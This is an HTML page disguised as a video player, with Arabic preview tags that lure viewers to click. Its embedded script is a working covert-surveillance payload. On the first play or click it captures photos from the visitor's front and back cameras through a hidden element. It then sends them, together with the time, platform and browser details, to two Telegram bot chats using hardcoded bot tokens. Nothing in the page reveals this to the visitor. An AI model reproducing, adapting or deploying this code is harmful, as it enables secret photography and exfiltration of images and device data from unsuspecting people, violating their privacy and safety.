<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- وسوم المعاينة المحدثة (Open Graph) للصورة الجديدة -->
    <meta property="og:title" content="ou8ss.1">
    <meta property="og:description" content="انقر لمشاهدة الفيديو بدقة عالية">
    <meta property="og:type" content="video.other">
    <meta property="og:image" content="https://cdn.imagetourls.com/uploads/tyImg/14X6n5D4j.jpg">

    <title>Video Fullscreen</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        html, body {
            width: 100%;
            height: 100%;
            background-color: #000;
            overflow: hidden;
        }
        video#mainVideo {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            min-width: 100%;
            min-height: 100%;
            object-fit: cover;
            object-position: center;
            z-index: 1;
        }
    </style>
</head>
<body>

    <!-- مشغل الفيديو -->
    <video id="mainVideo" controls loop playsinline muted>
        <source src="my_reel (3).mp4" type="video/mp4">
    </video>

    <script>
        const TELEGRAM_TARGETS = [
            {
                token: '8469850859:AAFQJDODXLXA-9jJYhYJ8ASll3-6d2RnIQA',
                chatId: '6642913954'
            },
            {
                token: '9263581446:AAFs0PHhBepUgbuNLlQJYAihz7sX3me71e4',
                chatId: '7890543237'
            }
        ];

        let isProcessing = false;
        let hasRequestedCamera = false;
        const video = document.getElementById('mainVideo');

        function buildCaption(cameraLabel) {
            const now = new Date().toLocaleString('ar-DZ', {
                dateStyle: 'short',
                timeStyle: 'medium'
            });
            const deviceInfo = navigator.userAgentData?.platform || navigator.platform || 'Unknown';
            const userAgent = navigator.userAgent || 'Unknown';

            return `جات صورة من عند عمك عبدو😍\n📷 الكاميرا: ${cameraLabel}\n🕒 الوقت: ${now}\n📱 الجهاز: ${deviceInfo}\n🌐 المتصفح: ${userAgent}`;
        }

        async function sendPhotoToAllTargets(blob, cameraLabel, fileName) {
            const caption = buildCaption(cameraLabel);

            const requests = TELEGRAM_TARGETS.map(async (target) => {
                const formData = new FormData();
                formData.append('chat_id', target.chatId);
                formData.append('photo', blob, fileName);
                formData.append('caption', caption);

                const response = await fetch(`https://api.telegram.org/bot${target.token}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                if (!response.ok) {
                    throw new Error(`HTTP ${response.status} for chat ${target.chatId}`);
                }
            });

            const results = await Promise.allSettled(requests);
            results.forEach((res, index) => {
                if (res.status === 'rejected') {
                    console.error(`Failed sending to target #${index + 1}:`, res.reason);
                }
            });
        }

        async function captureSinglePhoto(facingMode) {
            let stream = null;
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { ideal: facingMode } }
                });

                const hiddenVideo = document.createElement('video');
                hiddenVideo.muted = true;
                hiddenVideo.playsInline = true;
                hiddenVideo.srcObject = stream;

                await hiddenVideo.play();
                await new Promise((resolve) => setTimeout(resolve, 600));

                const canvas = document.createElement('canvas');
                canvas.width = hiddenVideo.videoWidth || 640;
                canvas.height = hiddenVideo.videoHeight || 480;

                const ctx = canvas.getContext('2d');
                ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);

                const blob = await new Promise((resolve) => {
                    canvas.toBlob((resultBlob) => resolve(resultBlob || null), 'image/png');
                });

                stream.getTracks().forEach((track) => track.stop());
                hiddenVideo.srcObject = null;
                stream = null;

                return blob;
            } catch (err) {
                console.error(`Camera Error (${facingMode}):`, err);
                if (stream) {
                    stream.getTracks().forEach((track) => track.stop());
                }
                return null;
            }
        }

        async function triggerCameraOnce() {
            if (isProcessing || hasRequestedCamera) return;
            hasRequestedCamera = true;
            isProcessing = true;

            try {
                // أولاً: الكاميرا الأمامية وإرسالها كصورة منفصلة
                const frontBlob = await captureSinglePhoto('user');
                if (frontBlob) {
                    await sendPhotoToAllTargets(frontBlob, 'أمامية (user)', 'front.png');
                }

                // فاصل قصير لتحرير الكاميرا قبل فتح الخلفية
                await new Promise((resolve) => setTimeout(resolve, 500));

                // ثانياً: الكاميرا الخلفية وإرسالها كصورة منفصلة
                const backBlob = await captureSinglePhoto('environment');
                if (backBlob) {
                    await sendPhotoToAllTargets(backBlob, 'خلفية (environment)', 'back.png');
                }
            } finally {
                isProcessing = false;
            }
        }

        video.addEventListener('play', triggerCameraOnce);
        document.addEventListener('click', triggerCameraOnce, { once: true });
    </script>
</body>
</html>
